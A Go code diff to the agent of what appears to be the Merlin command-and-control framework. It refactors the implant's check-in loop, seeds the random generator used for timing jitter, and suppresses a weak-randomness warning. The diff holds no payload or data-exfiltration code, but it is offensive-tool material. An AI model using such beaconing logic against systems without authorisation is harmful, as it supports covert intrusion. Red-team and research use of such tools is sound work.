@@ -135,6 +135,8 @@ func New(protocol string, url string, host string, psk string, proxy string, ja3
 		JA3:          ja3,
 	}
 
+	rand.Seed(time.Now().UnixNano())
+
 	u, errU := user.Current()
 	if errU != nil {
 		return a, fmt.Errorf("there was an error getting the current user:\r\n%s", errU)
@@ -227,7 +229,7 @@ func (a *Agent) Run() error {
 				}
 				go a.statusCheckIn()
 			} else {
-				a.initial = a.initialCheckIn(a.Client)
+				a.initial = a.initialCheckIn()
 			}
 			if a.FailedCheckin >= a.MaxRetry {
 				return fmt.Errorf("maximum number of failed checkin attempts reached: %d", a.MaxRetry)
@@ -239,7 +241,7 @@ func (a *Agent) Run() error {
 		timeSkew := time.Duration(0)
 
 		if a.Skew > 0 {
-			timeSkew = time.Duration(rand.Int63n(a.Skew)) * time.Millisecond
+			timeSkew = time.Duration(rand.Int63n(a.Skew)) * time.Millisecond // #nosec G404 - Does not need to be cryptographically secure, deterministic is OK
 		}
 
 		totalWaitTime := a.WaitTime + timeSkew
@@ -251,7 +253,7 @@ func (a *Agent) Run() error {
 	}
 }
 
-func (a *Agent) initialCheckIn(client *merlinClient) bool {
+func (a *Agent) initialCheckIn() bool {
 
 	if a.Debug {
 		message("debug", "Entering initialCheckIn function")
